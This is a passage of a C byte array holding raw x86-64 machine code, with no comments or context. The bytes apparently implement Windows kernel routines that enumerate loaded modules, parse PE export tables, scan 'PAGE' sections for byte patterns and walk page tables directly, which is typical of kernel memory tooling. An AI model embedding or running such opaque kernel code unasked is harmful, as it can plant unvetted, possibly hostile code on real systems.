	0x8B, 0x05, 0x42, 0x79, 0x00, 0x00, 0x48, 0x33, 0xC4, 0x48, 0x89, 0x84,
	0x24, 0xC0, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x05, 0xD0, 0x6A, 0x00, 0x00,
	0x48, 0x89, 0x44, 0x24, 0x60, 0x48, 0xC7, 0x44, 0x24, 0x68, 0x10, 0x00,
	0x00, 0x00, 0xC6, 0x44, 0x24, 0x70, 0x01, 0x48, 0x8D, 0x05, 0x36, 0x49,
	0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x78, 0x48, 0x8D, 0x05, 0xBA, 0x6A,
	0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0xC7,
	0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00, 0xC6, 0x84,
	0x24, 0x90, 0x00, 0x00, 0x00, 0x01, 0x48, 0x8D, 0x05, 0x17, 0x49, 0x00,
	0x00, 0x48, 0x89, 0x84, 0x24, 0x98, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x05,
	0xA0, 0x6A, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0xA0, 0x00, 0x00, 0x00,
	0x48, 0xC7, 0x84, 0x24, 0xA8, 0x00, 0x00, 0x00, 0x1C, 0x00, 0x00, 0x00,
	0xC6, 0x84, 0x24, 0xB0, 0x00, 0x00, 0x00, 0x01, 0x48, 0x8D, 0x05, 0xF5,
	0x48, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0xB8, 0x00, 0x00, 0x00, 0xE8,
	0x38, 0xE9, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x40, 0x48, 0x83, 0x7C,
	0x24, 0x40, 0x00, 0x75, 0x0A, 0xB8, 0x7A, 0x00, 0x00, 0xC0, 0xE9, 0xFF,
	0x00, 0x00, 0x00, 0x48, 0x8D, 0x44, 0x24, 0x60, 0x48, 0x89, 0x44, 0x24,
	0x38, 0x48, 0x8B, 0x44, 0x24, 0x38, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48,
	0x8B, 0x44, 0x24, 0x38, 0x48, 0x83, 0xC0, 0x60, 0x48, 0x89, 0x44, 0x24,
	0x50, 0xEB, 0x0E, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x48, 0x83, 0xC0, 0x20,
	0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8B, 0x44, 0x24, 0x50, 0x48, 0x39,
	0x44, 0x24, 0x28, 0x0F, 0x84, 0xAF, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44,
	0x24, 0x28, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30,
	0x4C, 0x8B, 0x48, 0x08, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x4C, 0x8B, 0x00,
	0xBA, 0x00, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x40, 0xE8, 0xA5,
	0x05, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x83, 0x7C, 0x24,
	0x20, 0x00, 0x74, 0x73, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x40,
	0x08, 0x48, 0x8B, 0x4C, 0x24, 0x20, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1,
	0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x0F, 0xB6,
	0x40, 0x10, 0x85, 0xC0, 0x74, 0x0F, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x8B, 0x00, 0x48, 0x89, 0x44, 0x24, 0x48, 0xEB, 0x10, 0x48, 0x8B, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x00, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x44, 0x24, 0x48, 0x48, 0x89, 0x05, 0x47, 0x78, 0x00,
	0x00, 0x48, 0x83, 0x3D, 0x3F, 0x78, 0x00, 0x00, 0x00, 0x74, 0x18, 0x48,
	0x8B, 0x05, 0x36, 0x78, 0x00, 0x00, 0x48, 0x25, 0x00, 0xF0, 0xFF, 0xFF,
	0x48, 0x89, 0x05, 0x29, 0x78, 0x00, 0x00, 0x33, 0xC0, 0xEB, 0x13, 0xE9,
	0x33, 0xFF, 0xFF, 0xFF, 0xB8, 0x01, 0x00, 0x00, 0xC0, 0xEB, 0x07, 0xB8,
	0x01, 0x00, 0x00, 0xC0, 0xEB, 0x00, 0x48, 0x8B, 0x8C, 0x24, 0xC0, 0x00,
	0x00, 0x00, 0x48, 0x33, 0xCC, 0xE8, 0x72, 0x41, 0x00, 0x00, 0x48, 0x81,
	0xC4, 0xD8, 0x00, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x57, 0x48, 0x81,
	0xEC, 0x90, 0x00, 0x00, 0x00, 0xE8, 0x0E, 0xFE, 0xFF, 0xFF, 0x85, 0xC0,
	0x7D, 0x07, 0x33, 0xC0, 0xE9, 0xFB, 0x02, 0x00, 0x00, 0x48, 0x8D, 0x44,
	0x24, 0x30, 0x48, 0x8B, 0xF8, 0x33, 0xC0, 0xB9, 0x08, 0x00, 0x00, 0x00,
	0xF3, 0xAA, 0x48, 0x8B, 0x84, 0x24, 0xA0, 0x00, 0x00, 0x00, 0x48, 0x89,
	0x44, 0x24, 0x30, 0x48, 0xC7, 0x44, 0x24, 0x38, 0x00, 0x00, 0x00, 0x00,
	0xE8, 0x87, 0xE4, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x78, 0x48, 0x8B,
	0x44, 0x24, 0x78, 0xFF, 0x15, 0x0F, 0x67, 0x00, 0x00, 0x48, 0x89, 0x44,
	0x24, 0x40, 0x48, 0x83, 0x7C, 0x24, 0x40, 0x00, 0x75, 0x07, 0x33, 0xC0,
	0xE9, 0xAB, 0x02, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00,
	0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44, 0x24,
	0x20, 0x48, 0x63, 0x44, 0x24, 0x20, 0x48, 0x6B, 0xC0, 0x10, 0x48, 0x8B,
	0x4C, 0x24, 0x40, 0x48, 0x83, 0x3C, 0x01, 0x00, 0x0F, 0x84, 0x7C, 0x02,
	0x00, 0x00, 0x48, 0x63, 0x44, 0x24, 0x20, 0x48, 0x6B, 0xC0, 0x10, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89,
	0x44, 0x24, 0x68, 0x48, 0x8B, 0x44, 0x24, 0x68, 0x48, 0x8B, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x28, 0x48, 0xC7, 0x44, 0x24, 0x48, 0x00, 0x00, 0x00,
	0x00, 0xEB, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x48, 0x48, 0x05, 0x00, 0x10,
	0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 0x8B, 0x44, 0x24, 0x28,
	0x48, 0x05, 0x00, 0x10, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48,
	0x8B, 0x44, 0x24, 0x68, 0x48, 0x8B, 0x40, 0x08, 0x48, 0x39, 0x44, 0x24,
	0x48, 0x0F, 0x83, 0x12, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x28,
	0x48, 0xC1, 0xE8, 0x0C, 0x48, 0x6B, 0xC0, 0x30, 0x48, 0x8B, 0x0D, 0xDD,
	0x76, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x84,
	0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0x80, 0x00, 0x00,
	0x00, 0x48, 0xB9, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x48,
	0x8B, 0x40, 0x28, 0x48, 0x23, 0xC1, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0x48,
	0xC1, 0xE9, 0x0C, 0x48, 0x3B, 0xC1, 0x0F, 0x85, 0xC0, 0x01, 0x00, 0x00,
	0x0F, 0xAE, 0xE8, 0x48, 0x8D, 0x44, 0x24, 0x50, 0x48, 0x8B, 0xF8, 0x33,
	0xC0, 0xB9, 0x08, 0x00, 0x00, 0x00, 0xF3, 0xAA, 0x48, 0x8B, 0x44, 0x24,
	0x30, 0x48, 0xC1, 0xE8, 0x27, 0x48, 0x25, 0xFF, 0x01, 0x00, 0x00, 0x48,
	0x8B, 0x4C, 0x24, 0x28, 0x48, 0x8D, 0x04, 0xC1, 0x4C, 0x8D, 0x4C, 0x24,
	0x38, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x50,
	0x48, 0x8B, 0xC8, 0xE8, 0x00, 0x1B, 0x00, 0x00, 0x85, 0xC0, 0x7D, 0x05,
	0xE9, 0x32, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x44, 0x24, 0x50, 0x48, 0x83,
	0xE0, 0x01, 0x48, 0x85, 0xC0, 0x75, 0x05, 0xE9, 0x1F, 0xFF, 0xFF, 0xFF,
	0x48, 0x8D, 0x44, 0x24, 0x58, 0x48, 0x8B, 0xF8, 0x33, 0xC0, 0xB9, 0x08,
	0x00, 0x00, 0x00, 0xF3, 0xAA, 0x48, 0x8B, 0x44, 0x24, 0x50, 0x48, 0xC1,
	0xE8, 0x0C, 0x48, 0xB9, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00,
	0x48, 0x23, 0xC1, 0x48, 0xC1, 0xE0, 0x0C, 0x48, 0x8B, 0x4C, 0x24, 0x30,
	0x48, 0xC1, 0xE9, 0x1E, 0x48, 0x81, 0xE1, 0xFF, 0x01, 0x00, 0x00, 0x48,
	0x8D, 0x04, 0xC8, 0x4C, 0x8D, 0x4C, 0x24, 0x38, 0x41, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x58, 0x48, 0x8B, 0xC8, 0xE8, 0x8D,
	0x1A, 0x00, 0x00, 0x85, 0xC0, 0x7D, 0x05, 0xE9, 0xBF, 0xFE, 0xFF, 0xFF,
	0x48, 0x8B, 0x44, 0x24, 0x58, 0x48, 0x83, 0xE0, 0x01, 0x48, 0x85, 0xC0,
	0x75, 0x05, 0xE9, 0xAC, 0xFE, 0xFF, 0xFF, 0x48, 0x8D, 0x44, 0x24, 0x60,
	0x48, 0x8B, 0xF8, 0x33, 0xC0, 0xB9, 0x08, 0x00, 0x00, 0x00, 0xF3, 0xAA,
	0x48, 0x8B, 0x44, 0x24, 0x58, 0x48, 0xC1, 0xE8, 0x0C, 0x48, 0xB9, 0xFF,
	0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x48, 0x23, 0xC1, 0x48, 0xC1,
	0xE0, 0x0C, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0x48, 0xC1, 0xE9, 0x15, 0x48,
	0x81, 0xE1, 0xFF, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x04, 0xC8, 0x4C, 0x8D,
	0x4C, 0x24, 0x38, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x54,
	0x24, 0x60, 0x48, 0x8B, 0xC8, 0xE8, 0x1A, 0x1A, 0x00, 0x00, 0x85, 0xC0,
	0x7D, 0x05, 0xE9, 0x4C, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0x44, 0x24, 0x60,
	0x48, 0x83, 0xE0, 0x01, 0x48, 0x85, 0xC0, 0x75, 0x05, 0xE9, 0x39, 0xFE,
	0xFF, 0xFF, 0x48, 0x8D, 0x44, 0x24, 0x70, 0x48, 0x8B, 0xF8, 0x33, 0xC0,
	0xB9, 0x08, 0x00, 0x00, 0x00, 0xF3, 0xAA, 0x48, 0x8B, 0x44, 0x24, 0x60,
	0x48, 0xC1, 0xE8, 0x0C, 0x48, 0xB9, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00,
	0x00, 0x00, 0x48, 0x23, 0xC1, 0x48, 0xC1, 0xE0, 0x0C, 0x48, 0x8B, 0x4C,
	0x24, 0x30, 0x48, 0xC1, 0xE9, 0x0C, 0x48, 0x81, 0xE1, 0xFF, 0x01, 0x00,
	0x00, 0x48, 0x8D, 0x04, 0xC8, 0x4C, 0x8D, 0x4C, 0x24, 0x38, 0x41, 0xB8,
	0x08, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x70, 0x48, 0x8B, 0xC8,
	0xE8, 0xA7, 0x19, 0x00, 0x00, 0x85, 0xC0, 0x7D, 0x05, 0xE9, 0xD9, 0xFD,
	0xFF, 0xFF, 0x48, 0x8B, 0x44, 0x24, 0x70, 0x48, 0x83, 0xE0, 0x01, 0x48,
	0x85, 0xC0, 0x75, 0x05, 0xE9, 0xC6, 0xFD, 0xFF, 0xFF, 0x48, 0x8B, 0x44,
	0x24, 0x28, 0xEB, 0x0C, 0xE9, 0xBA, 0xFD, 0xFF, 0xFF, 0xE9, 0x61, 0xFD,
	0xFF, 0xFF, 0x33, 0xC0, 0x48, 0x81, 0xC4, 0x90, 0x00, 0x00, 0x00, 0x5F,
	0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x4C, 0x89, 0x4C, 0x24, 0x20, 0x4C, 0x89, 0x44,
	0x24, 0x18, 0x89, 0x54, 0x24, 0x10, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x48,
	0x83, 0xEC, 0x48, 0xE8, 0x24, 0xE1, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24,
	0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48,
	0x8B, 0x4C, 0x24, 0x68, 0x48, 0x8B, 0x44, 0x24, 0x38, 0xFF, 0x15, 0xFD,
	0x63, 0x00, 0x00, 0x8B, 0x4C, 0x24, 0x58, 0x2B, 0xC8, 0x8B, 0xC1, 0x89,
	0x44, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0xEB,
	0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44, 0x24, 0x20, 0x8B,
	0x44, 0x24, 0x58, 0x39, 0x44, 0x24, 0x20, 0x77, 0x3B, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x50, 0x48, 0x03, 0xC8,
	0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28, 0x4C, 0x8B, 0x44, 0x24,
	0x68, 0x48, 0x8B, 0x54, 0x24, 0x60, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0xE8,
	0x20, 0xEA, 0xFF, 0xFF, 0x85, 0xC0, 0x74, 0x0A, 0x0F, 0xAE, 0xE8, 0x48,
	0x8B, 0x44, 0x24, 0x28, 0xEB, 0x04, 0xEB, 0xB1, 0x33, 0xC0, 0x48, 0x83,
	0xC4, 0x48, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x4C, 0x89, 0x44, 0x24, 0x18, 0x48, 0x89, 0x54, 0x24, 0x10, 0x48, 0x89,
	0x4C, 0x24, 0x08, 0x48, 0x83, 0xEC, 0x58, 0x48, 0xC7, 0x44, 0x24, 0x38,
	0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x60, 0x48, 0x63, 0x40,
	0x3C, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1,
	0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x0F, 0xB7,
	0x40, 0x14, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0x48, 0x8D, 0x44, 0x01, 0x18,
	0x48, 0x89, 0x44, 0x24, 0x40, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00,
	0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44, 0x24,
	0x20, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x0F, 0xB7, 0x40, 0x06, 0x39, 0x44,
	0x24, 0x20, 0x0F, 0x83, 0x8A, 0x00, 0x00, 0x00, 0x8B, 0x44, 0x24, 0x20,
	0x48, 0x6B, 0xC0, 0x28, 0x48, 0x8B, 0x4C, 0x24, 0x40, 0x48, 0x03, 0xC8,
	0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8B, 0x44, 0x24,
	0x28, 0x81, 0x38, 0x50, 0x41, 0x47, 0x45, 0x74, 0x21, 0x0F, 0xAE, 0xE8,
	0x48, 0x8B, 0x44, 0x24, 0x28, 0x41, 0xB8, 0x05, 0x00, 0x00, 0x00, 0x48,
	0x8D, 0x15, 0x02, 0x44, 0x00, 0x00, 0x48, 0x8B, 0xC8, 0xE8, 0x5A, 0x3D,
	0x00, 0x00, 0x85, 0xC0, 0x75, 0x3F, 0x0F, 0xAE, 0xE8, 0x48, 0x8B, 0x44,
	0x24, 0x28, 0x8B, 0x40, 0x0C, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x4C, 0x8B, 0x4C, 0x24, 0x70, 0x4C, 0x8B, 0x44,
	0x24, 0x68, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0x8B, 0x51, 0x08, 0x48, 0x8B,
	0xC8, 0xE8, 0x66, 0xFE, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48,
	0x83, 0x7C, 0x24, 0x38, 0x00, 0x74, 0x02, 0xEB, 0x05, 0xE9, 0x59, 0xFF,
	0xFF, 0xFF, 0x48, 0x8B, 0x44, 0x24, 0x38, 0x48, 0x83, 0xC4, 0x58, 0xC3,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x4C, 0x89, 0x4C, 0x24,
	0x20, 0x4C, 0x89, 0x44, 0x24, 0x18, 0x48, 0x89, 0x54, 0x24, 0x10, 0x48,
	0x89, 0x4C, 0x24, 0x08, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x8B, 0x44, 0x24,
	0x30, 0x48, 0x89, 0x44, 0x24, 0x10, 0x48, 0x8B, 0x44, 0x24, 0x40, 0x48,
	0x89, 0x44, 0x24, 0x18, 0x48, 0xC7, 0x44, 0x24, 0x08, 0x00, 0x00, 0x00,
	0x00, 0xEB, 0x0D, 0x48, 0x8B, 0x44, 0x24, 0x08, 0x48, 0xFF, 0xC0, 0x48,
	0x89, 0x44, 0x24, 0x08, 0x48, 0x8B, 0x44, 0x24, 0x48, 0x48, 0x8B, 0x4C,
	0x24, 0x38, 0x48, 0x2B, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x39, 0x44, 0x24,
	0x08, 0x77, 0x73, 0x48, 0xC7, 0x04, 0x24, 0x00, 0x00, 0x00, 0x00, 0x48,
	0x8B, 0x44, 0x24, 0x48, 0x48, 0x39, 0x04, 0x24, 0x73, 0x3B, 0x48, 0x8B,
	0x04, 0x24, 0x48, 0x8B, 0x4C, 0x24, 0x08, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x8B, 0x4C, 0x24, 0x10, 0x0F, 0xB6, 0x04, 0x01, 0x48, 0x8B,
	0x0C, 0x24, 0x48, 0x8B, 0x54, 0x24, 0x18, 0x48, 0x03, 0xD1, 0x48, 0x8B,
	0xCA, 0x0F, 0xB6, 0x09, 0x3B, 0xC1, 0x75, 0x0D, 0x48, 0x8B, 0x04, 0x24,
	0x48, 0xFF, 0xC0, 0x48, 0x89, 0x04, 0x24, 0xEB, 0xBA, 0x48, 0x8B, 0x44,
	0x24, 0x48, 0x48, 0x39, 0x04, 0x24, 0x75, 0x15, 0x0F, 0xAE, 0xE8, 0x48,
	0x8B, 0x44, 0x24, 0x08, 0x48, 0x8B, 0x4C, 0x24, 0x10, 0x48, 0x03, 0xC8,
	0x48, 0x8B, 0xC1, 0xEB, 0x07, 0xE9, 0x69, 0xFF, 0xFF, 0xFF, 0x33, 0xC0,
	0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x54, 0x24, 0x10, 0x48, 0x89, 0x4C,
	0x24, 0x08, 0x48, 0x81, 0xEC, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84,
	0x24, 0x90, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x8B,
	0x44, 0x24, 0x38, 0x48, 0x63, 0x40, 0x3C, 0x48, 0x8B, 0x4C, 0x24, 0x38,
	0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x40, 0xB8,
	0x08, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24,
	0x40, 0x48, 0x8B, 0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44,
	0x24, 0x48, 0x8B, 0x44, 0x24, 0x48, 0x48, 0x8B, 0x8C, 0x24, 0x90, 0x00,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x8B, 0x40, 0x20, 0x48, 0x8B, 0x8C,
	0x24, 0x90, 0x00, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00,
	0x00, 0xEB, 0x0D, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x48, 0xFF, 0xC0, 0x48,
	0x89, 0x44, 0x24, 0x28, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x8B, 0x40, 0x18,
	0x48, 0x39, 0x44, 0x24, 0x28, 0x0F, 0x83, 0xB7, 0x00, 0x00, 0x00, 0x0F,
	0xAE, 0xE8, 0x48, 0x8B, 0x44, 0x24, 0x50, 0x48, 0x8B, 0x4C, 0x24, 0x28,
	0x8B, 0x04, 0x88, 0x48, 0x8B, 0x8C, 0x24, 0x90, 0x00, 0x00, 0x00, 0x48,
	0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x60, 0xE8, 0x59,
	0xDE, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x58, 0x48, 0x8B, 0x44, 0x24,
	0x58, 0x48, 0x89, 0x44, 0x24, 0x68, 0x48, 0x8B, 0x94, 0x24, 0x98, 0x00,
	0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x68,
	0xFF, 0x15, 0x9A, 0x60, 0x00, 0x00, 0x85, 0xC0, 0x75, 0x5F, 0x0F, 0xAE,
	0xE8, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x8B, 0x40, 0x24, 0x48, 0x8B, 0x8C,
	0x24, 0x90, 0x00, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x8B, 0x4C, 0x24, 0x28, 0x0F, 0xB7, 0x04, 0x48, 0x66, 0x89, 0x44, 0x24,
	0x20, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x8C,
	0x24, 0x90, 0x00, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x0F,
	0xB7, 0x4C, 0x24, 0x20, 0x8B, 0x04, 0x88, 0x48, 0x8B, 0x8C, 0x24, 0x90,
	0x00, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44,
	0x24, 0x70, 0x48, 0x8B, 0x44, 0x24, 0x70, 0xEB, 0x07, 0xE9, 0x29, 0xFF,
	0xFF, 0xFF, 0x33, 0xC0, 0x48, 0x81, 0xC4, 0x88, 0x00, 0x00, 0x00, 0xC3,
	0x48, 0x81, 0xEC, 0xB8, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x40,
	0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00,
	0xE8, 0x83, 0xDC, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x50, 0x48, 0x8B,
	0x44, 0x24, 0x50, 0x48, 0x89, 0x44, 0x24, 0x58, 0x4C, 0x8D, 0x4C, 0x24,
	0x30, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0xB9, 0x0B, 0x00, 0x00, 0x00, 0x48,
	0x8B, 0x44, 0x24, 0x58, 0xFF, 0x15, 0xE2, 0x5F, 0x00, 0x00, 0x89, 0x44,
	0x24, 0x34, 0x81, 0x7C, 0x24, 0x34, 0x04, 0x00, 0x00, 0xC0, 0x74, 0x0A,
	0x48, 0x8B, 0x44, 0x24, 0x40, 0xE9, 0x26, 0x01, 0x00, 0x00, 0xE8, 0x9D,
	0xDF, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x60, 0x8B, 0x44, 0x24, 0x30,
	0x48, 0x89, 0x44, 0x24, 0x68, 0x48, 0x8B, 0x44, 0x24, 0x60, 0x48, 0x89,
	0x44, 0x24, 0x70, 0x48, 0x8B, 0x54, 0x24, 0x68, 0x33, 0xC9, 0x48, 0x8B,
	0x44, 0x24, 0x70, 0xFF, 0x15, 0x9B, 0x5F, 0x00, 0x00, 0x48, 0x89, 0x44,
	0x24, 0x38, 0x48, 0x83, 0x7C, 0x24, 0x38, 0x00, 0x75, 0x0A, 0x48, 0x8B,
	0x44, 0x24, 0x40, 0xE9, 0xE0, 0x00, 0x00, 0x00, 0xE8, 0xF7, 0xDB, 0xFF,
	0xFF, 0x48, 0x89, 0x44, 0x24, 0x78, 0x8B, 0x44, 0x24, 0x30, 0x89, 0x44,
	0x24, 0x48, 0x48, 0x8B, 0x44, 0x24, 0x78, 0x48, 0x89, 0x84, 0x24, 0x80,
	0x00, 0x00, 0x00, 0x45, 0x33, 0xC9, 0x44, 0x8B, 0x44, 0x24, 0x48, 0x48,
	0x8B, 0x54, 0x24, 0x38, 0xB9, 0x0B, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84,
	0x24, 0x80, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x45, 0x5F, 0x00, 0x00, 0x89,
	0x44, 0x24, 0x34, 0x83, 0x7C, 0x24, 0x34, 0x00, 0x7D, 0x3C, 0x0F, 0xAE,
	0xE8, 0xE8, 0xFA, 0xDF, 0xFF, 0xFF, 0x48, 0x89, 0x84, 0x24, 0x88, 0x00,
	0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x48, 0x89,
	0x84, 0x24, 0x90, 0x00, 0x00, 0x00, 0x33, 0xD2, 0x48, 0x8B, 0x4C, 0x24,
	0x38, 0x48, 0x8B, 0x84, 0x24, 0x90, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x05,
	0x5F, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x40, 0xEB, 0x5A, 0x48, 0x8B,
	0x44, 0x24, 0x38, 0x48, 0x83, 0x38, 0x00, 0x76, 0x18, 0xB8, 0x28, 0x01,
	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x48,
	0x8B, 0x44, 0x01, 0x18, 0x48, 0x89, 0x44, 0x24, 0x40, 0xE8, 0x9E, 0xDF,
	0xFF, 0xFF, 0x48, 0x89, 0x84, 0x24, 0x98, 0x00, 0x00, 0x00, 0x48, 0x8B,
	0x84, 0x24, 0x98, 0x00, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0xA0, 0x00,
	0x00, 0x00, 0x33, 0xD2, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x48, 0x8B, 0x84,
	0x24, 0xA0, 0x00, 0x00, 0x00, 0xFF, 0x15, 0xA9, 0x5E, 0x00, 0x00, 0x48,
	0x8B, 0x44, 0x24, 0x40, 0x48, 0x81, 0xC4, 0xB8, 0x00, 0x00, 0x00, 0xC3,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x48, 0x81, 0xEC,
	0xE8, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x40, 0x00, 0x00, 0x00, 0x00,
	0xC7, 0x44, 0x24, 0x34, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24,
	0x38, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x50, 0x00, 0x00,
